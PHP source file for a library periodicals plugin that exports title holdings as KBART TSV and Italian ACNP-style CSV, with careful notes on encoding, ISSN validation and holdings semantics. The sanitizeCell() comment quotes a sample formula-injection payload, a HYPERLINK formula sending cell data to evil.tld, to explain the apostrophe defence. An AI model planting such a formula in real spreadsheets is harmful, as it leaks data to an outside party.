<?php

declare(strict_types=1);

namespace App\Plugins\Emeroteca\Support;

use mysqli;
use mysqli_result;
use mysqli_stmt;

require_once __DIR__ . '/IssnHelper.php';

/**
 * Holdings exports for union catalogues (review #140).
 *
 * Two serializations of the same underlying holdings:
 *
 *  • kbart()  — NISO RP-9-2014 (KBART Phase II) TSV: the de-facto exchange
 *               format for title-level coverage, ingested by knowledge
 *               bases and discovery layers.
 *  • acnp()   — CSV in the style of ACNP (Catalogo Italiano dei Periodici),
 *               one row per title with the holdings declared the way an
 *               Italian union catalogue expects it: "1998: 1-8, 10-12; lac. 9".
 *
 * Pure component: every method takes the mysqli handle and returns a string.
 * No routes, no headers, no echo — the HTTP layer wraps these.
 *
 * There is no PSR-4 autoloader scope for plugin classes (see IssnHelper):
 * callers `require_once` this file directly.
 *
 * ── Encoding decisions ────────────────────────────────────────────────
 * UTF-8 **without BOM**, newline "\n". Both files are machine-ingested by
 * catalogue loaders; a BOM ends up glued to the first header cell
 * ("\xEF\xBB\xBFpublication_title") and breaks strict header matching —
 * which is exactly what KBART validators do. Excel's UTF-8 auto-detection
 * is not worth corrupting the header for.
 *
 * ── Field policy ──────────────────────────────────────────────────────
 * • coverage_depth: 'fulltext' when the title has at least one issue with a
 *   PUBLIC PDF (pdf_path set AND pdf_pubblico = 1) — that is genuine online
 *   full text; otherwise 'print', which states plainly that the holdings are
 *   physical issues on a shelf. 'selected articles' is deliberately not used:
 *   it would describe article-level licensing we do not have.
 * • access_type: 'F' (free) alongside 'fulltext', empty for print-only
 *   holdings — KBART leaves access_type optional and asserting 'P' (paid)
 *   would claim a subscription model that does not exist here.
 * • title_id: "emeroteca:{id}", a stable local identifier. The same scheme is
 *   used for preceding_publication_title_id so intra-file references resolve.
 * • date_first/last_issue_online carry the YEAR of the first/last annata with
 *   at least one owned issue. The "_online" suffix is KBART legacy naming;
 *   union catalogues read these as the coverage bounds regardless of carrier.
 *
 * ── Possession semantics (shared by both exports) ─────────────────────
 * Driven by `stato` only, never by `condizione` — a damaged but owned issue
 * is still owned (same rule as EmerotecaPlugin::consistenzaTestata):
 *   posseduto              → counts as held, enters the ranges
 *   mancante               → counts as a gap, listed after "lac."
 *   atteso, reclamato      → neither: not yet due, claiming them as either
 *                            held or missing would misstate the holdings
 *   scartato               → neither: a deliberate withdrawal is not a hole
 *   smarrito               → neither, for coherence with consistenzaTestata()
 *
 * An issue whose `numero` is empty (the column is NOT NULL but accepts '')
 * is NOT skipped: it is a real issue on the shelf and consistenzaTestata()
 * counts it, so it enters the statement under the biblioteconomic marker
 * `s.n.` (senza numero). Skipping it made an annata holding only unnumbered
 * issues look empty in the very file the union catalogue ingests.
 *
 * ── consistenza_dichiarata (CANONICAL RULE) ───────────────────────────
 * The curator-written statement is APPENDED to the computed one, separated
 * by ' · ', and never replaces it — identical to
 * EmerotecaPlugin::consistenzaTestata(). Replacing it would have dropped
 * every really-owned issue of that annata from the export; the two
 * statements answer different questions (what the shelf holds vs. what the
 * curator declares) and a union catalogue wants both. When there is nothing
 * computed the declared statement stands alone; when there is neither, the
 * empty sentinel is '—' (same as consistenzaTestata).
 *
 * ── Spreadsheet formula injection ─────────────────────────────────────
 * Both files are opened in Excel / LibreOffice by the catalogue operator.
 * RFC-4180 quoting does NOT stop a cell that starts with '=', '+', '-' or
 * '@' from being evaluated as a formula, so every DATA cell (never the
 * header, whose spelling is part of the KBART contract) goes through
 * sanitizeCell() and is prefixed with an apostrophe when it starts with one
 * of those four characters.
 */
final class KbartExporter
{
    /**
     * The 25 KBART Phase II columns, in the canonical order mandated by
     * NISO RP-9-2014. Order and spelling are part of the contract: do not
     * translate, reorder or extend.
     *
     * @var list<string>
     */
    public const KBART_COLUMNS = [
        'publication_title',
        'print_identifier',
        'online_identifier',
        'date_first_issue_online',
        'num_first_vol_online',
        'num_first_issue_online',
        'date_last_issue_online',
        'num_last_vol_online',
        'num_last_issue_online',
        'title_url',
        'first_author',
        'title_id',
        'embargo_info',
        'coverage_depth',
        'notes',
        'publisher_name',
        'publication_type',
        'date_monograph_published_print',
        'date_monograph_published_online',
        'monograph_volume',
        'monograph_edition',
        'first_editor',
        'parent_publication_title_id',
        'preceding_publication_title_id',
        'access_type',
    ];

    /**
     * ACNP-style CSV columns. Technical identifiers, intentionally NOT
     * translated: the file is consumed by an Italian union catalogue loader,
     * not read by an end user.
     *
     * @var list<string>
     */
    public const ACNP_COLUMNS = [
        'titolo',
        'issn',
        'e_issn',
        'editore',
        'luogo_pubblicazione',
        'periodicita',
        'tipo',
        'consistenza',
        'url',
    ];

    /** Separator between per-year holdings statements inside one ACNP cell. */
    private const ACNP_YEAR_SEPARATOR = ' | ';

    /**
     * Separator between the computed holdings and the curator-written
     * `consistenza_dichiarata`. Same glue as
     * EmerotecaPlugin::consistenzaTestata() — the two statements are shown
     * side by side, never one instead of the other.
     */
    private const DECLARED_SEPARATOR = ' · ';

    /** Rendered when an annata holds nothing at all (consistenzaTestata sentinel). */
    private const EMPTY_HOLDINGS = '—';

    /**
     * Marker for an issue with no designation at all. Not translated: it is a
     * data value in a machine-ingested file, and "s.n." is the abbreviation
     * Italian union catalogues already use for an unnumbered issue.
     */
    private const UNNUMBERED_MARKER = 's.n.';

    /**
     * Per-connection cache of the optional core tables probed by this
     * exporter. Keyed by handle so two mysqli connections in the same
     * process (tests) never inherit each other's schema.
     *
     * @var array<string, bool>
     */
    private static array $tableCache = [];

    /**
     * KBART Phase II TSV export.
     *
     * @param int|null $testataId Restrict to one title; null exports all.
     */
    public static function kbart(mysqli $db, ?int $testataId = null): string
    {
        $out = implode("\t", self::KBART_COLUMNS) . "\n";

        foreach (self::collectHoldings($db, $testataId) as $holding) {
            $testata  = $holding['testata'];
            $coverage = $holding['coverage'];

            $row = [
                'publication_title'              => (string) $testata['titolo'],
                'print_identifier'               => self::formatIssn((string) ($testata['issn'] ?? '')),
                'online_identifier'              => self::formatIssn((string) ($testata['e_issn'] ?? '')),
                'date_first_issue_online'        => $coverage['first_year'],
                'num_first_vol_online'           => $coverage['first_vol'],
                'num_first_issue_online'         => $coverage['first_issue'],
                'date_last_issue_online'         => $coverage['last_year'],
                'num_last_vol_online'            => $coverage['last_vol'],
                'num_last_issue_online'          => $coverage['last_issue'],
                'title_url'                      => self::testataUrl((int) $testata['id']),
                'first_author'                   => '',
                'title_id'                       => self::titleId((int) $testata['id']),
                'embargo_info'                   => '',
                'coverage_depth'                 => $holding['has_public_pdf'] ? 'fulltext' : 'print',
                'notes'                          => $holding['notes'],
                'publisher_name'                 => (string) ($testata['editore_nome'] ?? ''),
                'publication_type'               => 'serial',
                'date_monograph_published_print' => '',
                'date_monograph_published_online' => '',
                'monograph_volume'               => '',
                'monograph_edition'              => '',
                'first_editor'                   => '',
                'parent_publication_title_id'    => '',
                'preceding_publication_title_id' => $testata['testata_precedente_id'] !== null
                    ? self::titleId((int) $testata['testata_precedente_id'])
                    : '',
                'access_type'                    => $holding['has_public_pdf'] ? 'F' : '',
            ];

            $cells = [];
            foreach (self::KBART_COLUMNS as $column) {
                // Data cells only — the header above is written verbatim.
                $cells[] = self::sanitizeCell(self::oneLine($row[$column]));
            }
            $out .= implode("\t", $cells) . "\n";
        }

        return $out;
    }

    /**
     * ACNP-style CSV export: one row per title, holdings declared per year.
     *
     * @param int|null $testataId Restrict to one title; null exports all.
     */
    public static function acnp(mysqli $db, ?int $testataId = null): string
    {
        $out = implode(',', array_map([self::class, 'csvCell'], self::ACNP_COLUMNS)) . "\n";

        foreach (self::collectHoldings($db, $testataId) as $holding) {
            $testata = $holding['testata'];
            $cells = [
                (string) $testata['titolo'],
                self::formatIssn((string) ($testata['issn'] ?? '')),
                self::formatIssn((string) ($testata['e_issn'] ?? '')),
                (string) ($testata['editore_nome'] ?? ''),
                (string) ($testata['luogo_pubblicazione'] ?? ''),
                (string) ($testata['periodicita'] ?? ''),
                (string) ($testata['tipo'] ?? ''),
                $holding['notes'],
                self::testataUrl((int) $testata['id']),
            ];
            $out .= implode(',', array_map(
                // Data cells only — the header above is written verbatim.
                static fn (string $cell): string => self::csvCell(self::sanitizeCell(self::oneLine($cell))),
                $cells
            )) . "\n";
        }

        return $out;
    }

    /**
     * Holdings statement for ONE annata, in the biblioteconomic form used by
     * ACNP: "1-8, 10-12; lac. 9".
     *
     * Reusable on its own (the admin annata view and the public page want the
     * same string). The curator-written `consistenza_dichiarata` is APPENDED
     * after ' · ', never substituted (see the class docblock); '—' when the
     * annata has neither holdings, nor gaps, nor a declared statement.
     */
    public static function consistenzaAnnata(mysqli $db, int $annataId): string
    {
        $stmt = $db->prepare('SELECT consistenza_dichiarata FROM emeroteca_annate WHERE id = ?');
        if ($stmt === false) {
            return '';
        }
        $stmt->bind_param('i', $annataId);
        if (!$stmt->execute()) {
            $stmt->close();
            return '';
        }
        $res = $stmt->get_result();
        $row = $res instanceof mysqli_result ? $res->fetch_assoc() : null;
        $stmt->close();
        if (!is_array($row)) {
            return '';
        }
        $dichiarata = $row['consistenza_dichiarata'] !== null ? (string) $row['consistenza_dichiarata'] : null;

        $byAnnata = self::fetchFascicoli($db, [$annataId]);

        $statement = self::consistenzaFromRows($dichiarata, $byAnnata[$annataId] ?? []);

        return $statement === '' ? self::EMPTY_HOLDINGS : $statement;
    }

    // ── data collection ───────────────────────────────────────────────

    /**
     * Load every exported title with its computed coverage and notes.
     *
     * One query per level (titles → annate → fascicoli), never per row: the
     * export must not degrade into N+1 on a large emeroteca.
     *
     * @return list<array{
     *     testata: array<string, mixed>,
     *     coverage: array{first_year:string,first_vol:string,first_issue:string,last_year:string,last_vol:string,last_issue:string},
     *     notes: string,
     *     has_public_pdf: bool
     * }>
     */
    private static function collectHoldings(mysqli $db, ?int $testataId): array
    {
        $testate = self::fetchTestate($db, $testataId);
        if ($testate === []) {
            return [];
        }

        $testataIds = array_map(static fn (array $t): int => (int) $t['id'], $testate);
        $annateByTestata = self::fetchAnnate($db, $testataIds);

        $annataIds = [];
        foreach ($annateByTestata as $annate) {
            foreach ($annate as $annata) {
                $annataIds[] = (int) $annata['id'];
            }
        }
        $fascicoliByAnnata = self::fetchFascicoli($db, $annataIds);
        $publicPdfTestate  = self::fetchTestateWithPublicPdf($db, $testataIds);

        $out = [];
        foreach ($testate as $testata) {
            $tid    = (int) $testata['id'];
            $annate = $annateByTestata[$tid] ?? [];

            $notesParts = [];
            $ownedAnnate = [];
            foreach ($annate as $annata) {
                $aid  = (int) $annata['id'];
                $rows = $fascicoliByAnnata[$aid] ?? [];

                $dichiarata = $annata['consistenza_dichiarata'] !== null
                    ? (string) $annata['consistenza_dichiarata']
                    : null;
                $statement = self::consistenzaFromRows($dichiarata, $rows);
                if ($statement !== '') {
                    $notesParts[] = $annata['anno'] . ': ' . $statement;
                }

                $owned = self::ownedNumbers($rows);
                if ($owned !== []) {
                    $ownedAnnate[] = ['annata' => $annata, 'owned' => $owned];
                }
            }

            $out[] = [
                'testata'        => $testata,
                'coverage'       => self::buildCoverage($ownedAnnate),
                'notes'          => implode(self::ACNP_YEAR_SEPARATOR, $notesParts),
                'has_public_pdf' => in_array($tid, $publicPdfTestate, true),
            ];
        }

        return $out;
    }

    /**
     * @return list<array<string, mixed>>
     */
    private static function fetchTestate(mysqli $db, ?int $testataId): array
    {
        // `editori` is a core table but the plugin tolerates degraded installs
        // (AbstractAdminController::tableExists, PublicController). An
        // unconditional JOIN there made the whole statement fail and the route
        // answered 200 with a header-only file — which the operator would then
        // upload to the union catalogue AS THEIR HOLDINGS. Degrade the column,
        // never the export.
        $hasEditori = self::tableExists($db, 'editori');
        $sql = 'SELECT t.id, t.titolo, t.issn, t.e_issn, t.issn_l, t.luogo_pubblicazione,
                       t.periodicita, t.tipo, t.testata_precedente_id, '
             . ($hasEditori ? 'e.nome AS editore_nome' : "'' AS editore_nome")
             . ' FROM emeroteca_testate t'
             . ($hasEditori ? ' LEFT JOIN editori e ON e.id = t.editore_id' : '');
        if ($testataId !== null) {
            $sql .= ' WHERE t.id = ?';
        }
        $sql .= ' ORDER BY t.titolo ASC, t.id ASC';

        $stmt = $db->prepare($sql);
        if ($stmt === false) {
            return [];
        }
        if ($testataId !== null) {
            $stmt->bind_param('i', $testataId);
        }
        if (!$stmt->execute()) {
            $stmt->close();
            return [];
        }

        return self::drain($stmt);
    }

    /**
     * @param  list<int> $testataIds
     * @return array<int, list<array<string, mixed>>> keyed by testata_id, chronological
     */
    private static function fetchAnnate(mysqli $db, array $testataIds): array
    {
        if ($testataIds === []) {
            return [];
        }
        $stmt = self::prepareIn(
            $db,
            'SELECT id, testata_id, anno, volume, serie, consistenza_dichiarata
               FROM emeroteca_annate
              WHERE testata_id IN (%s)
              ORDER BY anno ASC, volume ASC, id ASC',
            $testataIds
        );
        if ($stmt === null) {
            return [];
        }

        $out = [];
        foreach (self::drain($stmt) as $row) {
            $out[(int) $row['testata_id']][] = $row;
        }
        return $out;
    }

    /**
     * @param  list<int> $annataIds
     * @return array<int, list<array{numero:string, stato:string}>> keyed by annata_id
     */
    private static function fetchFascicoli(mysqli $db, array $annataIds): array
    {
        if ($annataIds === []) {
            return [];
        }
        $stmt = self::prepareIn(
            $db,
            'SELECT annata_id, numero, stato
               FROM emeroteca_fascicoli
              WHERE annata_id IN (%s)
              ORDER BY id ASC',
            $annataIds
        );
        if ($stmt === null) {
            return [];
        }

        $out = [];
        foreach (self::drain($stmt) as $row) {
            $out[(int) $row['annata_id']][] = [
                'numero' => (string) $row['numero'],
                'stato'  => (string) $row['stato'],
            ];
        }
        return $out;
    }

    /**
     * Titles owning at least one issue whose PDF is stored AND publicly
     * downloadable — the only case in which we may claim full text.
     *
     * @param  list<int> $testataIds
     * @return list<int>
     */
    private static function fetchTestateWithPublicPdf(mysqli $db, array $testataIds): array
    {
        if ($testataIds === []) {
            return [];
        }
        $stmt = self::prepareIn(
            $db,
            'SELECT DISTINCT a.testata_id
               FROM emeroteca_fascicoli f
               JOIN emeroteca_annate a ON a.id = f.annata_id
              WHERE a.testata_id IN (%s)
                AND f.pdf_path IS NOT NULL
                AND f.pdf_path <> \'\'
                AND f.pdf_pubblico = 1',
            $testataIds
        );
        if ($stmt === null) {
            return [];
        }

        $out = [];
        foreach (self::drain($stmt) as $row) {
            $out[] = (int) $row['testata_id'];
        }
        return $out;
    }

    /**
     * Prepare a statement whose only placeholder group is an integer IN list.
     *
     * @param  list<int> $ids
     */
    private static function prepareIn(mysqli $db, string $sqlTemplate, array $ids): ?mysqli_stmt
    {
        $ids = array_values(array_unique($ids));
        $placeholders = implode(',', array_fill(0, count($ids), '?'));
        $stmt = $db->prepare(sprintf($sqlTemplate, $placeholders));
        if ($stmt === false) {
            return null;
        }
        $stmt->bind_param(str_repeat('i', count($ids)), ...$ids);
        if (!$stmt->execute()) {
            $stmt->close();
            return null;
        }
        return $stmt;
    }

    /**
     * @return list<array<string, mixed>>
     */
    private static function drain(mysqli_stmt $stmt): array
    {
        $res = $stmt->get_result();
        $out = [];
        if ($res instanceof mysqli_result) {
            while ($row = $res->fetch_assoc()) {
                $out[] = $row;
            }
        }
        $stmt->close();
        return $out;
    }

    // ── holdings computation ──────────────────────────────────────────

    /**
     * Compact a set of issues into a holdings statement.
     *
     * Pure numbers collapse into ranges ("1-8"); anything else (e.g. "13-14",
     * "12bis", "S1") cannot be range-collapsed without inventing issues that
     * may not exist, so it is listed verbatim after the numeric runs. An issue
     * with no designation at all becomes a single `s.n.` token rather than
     * disappearing. Gaps follow the same treatment behind "lac.".
     *
     * The declared statement is appended, never substituted — see the class
     * docblock for the canonical rule. Returns '' (the caller decides whether
     * that is '—' or "omit this year") when there is nothing to say.
     *
     * @param list<array{numero:string, stato:string}> $rows
     */
    private static function consistenzaFromRows(?string $dichiarata, array $rows): string
    {
        $declared = trim((string) $dichiarata);
        $declared = $declared !== '' ? self::oneLine($declared) : '';

        $ownedInts = [];
        $ownedOther = [];
        $gapInts = [];
        $gapOther = [];

        foreach ($rows as $row) {
            $numero = trim($row['numero']);
            if ($numero === '') {
                // Unnumbered but real: consistenzaTestata() counts it, so the
                // export must not pretend the shelf is empty.
                $numero = self::UNNUMBERED_MARKER;
            }
            $isNumeric = preg_match('/^\d+$/', $numero) === 1;

            switch ($row['stato']) {
                case 'posseduto':
                    if ($isNumeric) {
                        $ownedInts[] = (int) $numero;
                    } else {
                        $ownedOther[] = $numero;
                    }
                    break;
                case 'mancante':
                    if ($isNumeric) {
                        $gapInts[] = (int) $numero;
                    } else {
                        $gapOther[] = $numero;
                    }
                    break;
                default:
                    // atteso / reclamato / scartato / smarrito: see class docblock.
                    break;
            }
        }

        $owned = self::compactList($ownedInts, $ownedOther);
        $gaps  = self::compactList($gapInts, $gapOther);

        if ($owned === '' && $gaps === '') {
            $computed = '';
        } elseif ($gaps === '') {
            $computed = $owned;
        } else {
            $lacune = 'lac. ' . $gaps;
            $computed = $owned === '' ? $lacune : $owned . '; ' . $lacune;
        }

        if ($computed === '') {
            return $declared;
        }
        if ($declared === '') {
            return $computed;
        }

        return $computed . self::DECLARED_SEPARATOR . $declared;
    }

    /**
     * "1-8, 10-12" from consecutive integer runs, with the non-numeric issue
     * designations appended verbatim in natural order.
     *
     * @param list<int>    $ints
     * @param list<string> $others
     */
    private static function compactList(array $ints, array $others): string
    {
        $ints = array_values(array_unique($ints));
        sort($ints, SORT_NUMERIC);

        $parts = [];
        $count = count($ints);
        for ($i = 0; $i < $count; $i++) {
            $start = $ints[$i];
            $end = $start;
            while ($i + 1 < $count && $ints[$i + 1] === $end + 1) {
                $i++;
                $end = $ints[$i];
            }
            $parts[] = $start === $end ? (string) $start : $start . '-' . $end;
        }

        $others = array_values(array_unique($others));
        usort($others, [self::class, 'compareIssueNumbers']);
        foreach ($others as $other) {
            $parts[] = $other;
        }

        return implode(', ', $parts);
    }

    /**
     * Owned issue designations of one annata, in natural order.
     *
     * An unnumbered owned issue still makes the annata part of the coverage
     * (same reason as consistenzaFromRows): it is on the shelf.
     *
     * @param  list<array{numero:string, stato:string}> $rows
     * @return list<string>
     */
    private static function ownedNumbers(array $rows): array
    {
        $owned = [];
        foreach ($rows as $row) {
            if ($row['stato'] !== 'posseduto') {
                continue;
            }
            $numero = trim($row['numero']);
            $owned[] = $numero !== '' ? $numero : self::UNNUMBERED_MARKER;
        }
        $owned = array_values(array_unique($owned));
        usort($owned, [self::class, 'compareIssueNumbers']);
        return $owned;
    }

    /**
     * Natural ordering for issue designations: compare the leading integer
     * when both have one ("2" before "10", "13-14" after "12"), fall back to
     * a case-insensitive string comparison otherwise.
     */
    private static function compareIssueNumbers(string $a, string $b): int
    {
        $hasA = preg_match('/^\d+/', $a, $ma) === 1;
        $hasB = preg_match('/^\d+/', $b, $mb) === 1;

        if ($hasA && $hasB) {
            $na = (int) $ma[0];
            $nb = (int) $mb[0];
            return $na !== $nb ? $na <=> $nb : strcasecmp($a, $b);
        }
        if ($hasA) {
            return -1;
        }
        if ($hasB) {
            return 1;
        }
        return strcasecmp($a, $b);
    }

    /**
     * First/last coverage point across the annate that actually own something.
     *
     * @param list<array{annata: array<string, mixed>, owned: list<string>}> $ownedAnnate
     * @return array{first_year:string,first_vol:string,first_issue:string,last_year:string,last_vol:string,last_issue:string}
     */
    private static function buildCoverage(array $ownedAnnate): array
    {
        if ($ownedAnnate === []) {
            return [
                'first_year' => '', 'first_vol' => '', 'first_issue' => '',
                'last_year'  => '', 'last_vol'  => '', 'last_issue'  => '',
            ];
        }

        $first = $ownedAnnate[0];
        $last  = $ownedAnnate[count($ownedAnnate) - 1];

        return [
            'first_year'  => (string) $first['annata']['anno'],
            'first_vol'   => self::volumeLabel($first['annata']),
            'first_issue' => $first['owned'][0],
            'last_year'   => (string) $last['annata']['anno'],
            'last_vol'    => self::volumeLabel($last['annata']),
            'last_issue'  => $last['owned'][count($last['owned']) - 1],
        ];
    }

    /**
     * Volume designation of an annata; falls back to the series when the
     * volume was never filled in (volume is NOT NULL DEFAULT '' since 1.4.0).
     *
     * @param array<string, mixed> $annata
     */
    private static function volumeLabel(array $annata): string
    {
        $volume = trim((string) ($annata['volume'] ?? ''));
        if ($volume !== '') {
            return $volume;
        }
        return trim((string) ($annata['serie'] ?? ''));
    }

    // ── formatting ────────────────────────────────────────────────────

    /**
     * Canonical hyphenated ISSN, or '' when the column is empty OR does not
     * validate.
     *
     * Formatting without validating was worse than emitting nothing: a legacy
     * typo like "12345678" came out as "1234-5678", a perfectly well-formed
     * ISSN that belongs to a DIFFERENT journal — the knowledge base would then
     * bind these holdings to somebody else's title. An absent identifier only
     * costs a match; a wrong one corrupts the union catalogue.
     *
     * Deliberately NOT annotated in `notes`: that field is also the ACNP
     * `consistenza` cell, and a diagnostic message inside the holdings
     * statement would be ingested as holdings.
     */
    private static function formatIssn(string $issn): string
    {
        $issn = trim($issn);
        if ($issn === '') {
            return '';
        }
        if (!IssnHelper::isValidFormat($issn) || !IssnHelper::isValidChecksum($issn)) {
            return '';
        }
        return IssnHelper::normalize($issn);
    }

    /**
     * True when a core table this exporter can live without is present.
     * Mirrors AbstractAdminController::tableExists(), cached per connection.
     */
    private static function tableExists(mysqli $db, string $table): bool
    {
        $key = spl_object_id($db) . '|' . $table;
        if (array_key_exists($key, self::$tableCache)) {
            return self::$tableCache[$key];
        }
        $exists = false;
        try {
            $stmt = $db->prepare(
                'SELECT COUNT(*) AS c FROM information_schema.TABLES
                  WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ?'
            );
            if ($stmt !== false) {
                $stmt->bind_param('s', $table);
                if ($stmt->execute()) {
                    $res = $stmt->get_result();
                    $exists = $res instanceof mysqli_result
                        && ((int) ($res->fetch_assoc()['c'] ?? 0)) > 0;
                }
                $stmt->close();
            }
        } catch (\Throwable $e) {
            $exists = false;
        }
        return self::$tableCache[$key] = $exists;
    }

    /** Stable local identifier, also used for intra-file title references. */
    private static function titleId(int $testataId): string
    {
        return 'emeroteca:' . $testataId;
    }

    /**
     * Absolute public URL of the title. Uses the core helper when the HTTP
     * stack is bootstrapped; degrades to the relative path in CLI contexts
     * (cron, unit tests) where there is no request to derive a host from.
     */
    private static function testataUrl(int $testataId): string
    {
        $path = '/emeroteca/' . $testataId;
        if (function_exists('absoluteUrl')) {
            return absoluteUrl($path);
        }
        return $path;
    }

    /**
     * Collapse every TAB, CR, LF and other C0 control character to a single
     * space. Mandatory for the TSV (a stray TAB shifts every later column
     * into the wrong field) and applied to the CSV too so a row is always
     * one physical line.
     *
     * NO /u modifier, on purpose: the character classes are pure ASCII, while
     * `preg_replace` with /u returns NULL on the first invalid UTF-8 byte —
     * and `(string) null` is ''. A single latin-1 byte in a legacy title
     * therefore used to blank out `publication_title` silently. Byte-wise
     * matching is safe here because no C0 byte can occur inside a UTF-8
     * multi-byte sequence. The `?? $value` keeps the original text even if
     * the engine fails for some other reason (backtrack limit).
     */
    private static function oneLine(string $value): string
    {
        $value = preg_replace('/[\x00-\x1F\x7F]+/', ' ', $value) ?? $value;
        $value = preg_replace('/\s{2,}/', ' ', $value) ?? $value;
        return trim($value);
    }

    /**
     * Neutralize a spreadsheet formula.
     *
     * Both exports are opened in Excel / LibreOffice by the operator of the
     * union catalogue: a cell starting with '=', '+', '-' or '@' is EVALUATED
     * there, and RFC-4180 quoting does not change that. A curator-written
     * `consistenza_dichiarata` such as
     * `=HYPERLINK("https://evil.tld/?d="&A2,"Apri")` would otherwise reach
     * that spreadsheet verbatim. Prefixing an apostrophe forces the cell to
     * text; the apostrophe is not part of the value for a machine loader
     * reading the raw TSV/CSV either way, and only DATA cells get it — the
     * header spelling is part of the KBART contract.
     */
    private static function sanitizeCell(string $value): string
    {
        if ($value !== '' && preg_match('/^[=+\-@]/', $value) === 1) {
            return "'" . $value;
        }
        return $value;
    }

    /** RFC 4180 cell: quote when it contains a comma or a double quote. */
    private static function csvCell(string $value): string
    {
        if (strpbrk($value, ",\"") === false) {
            return $value;
        }
        return '"' . str_replace('"', '""', $value) . '"';
    }
}
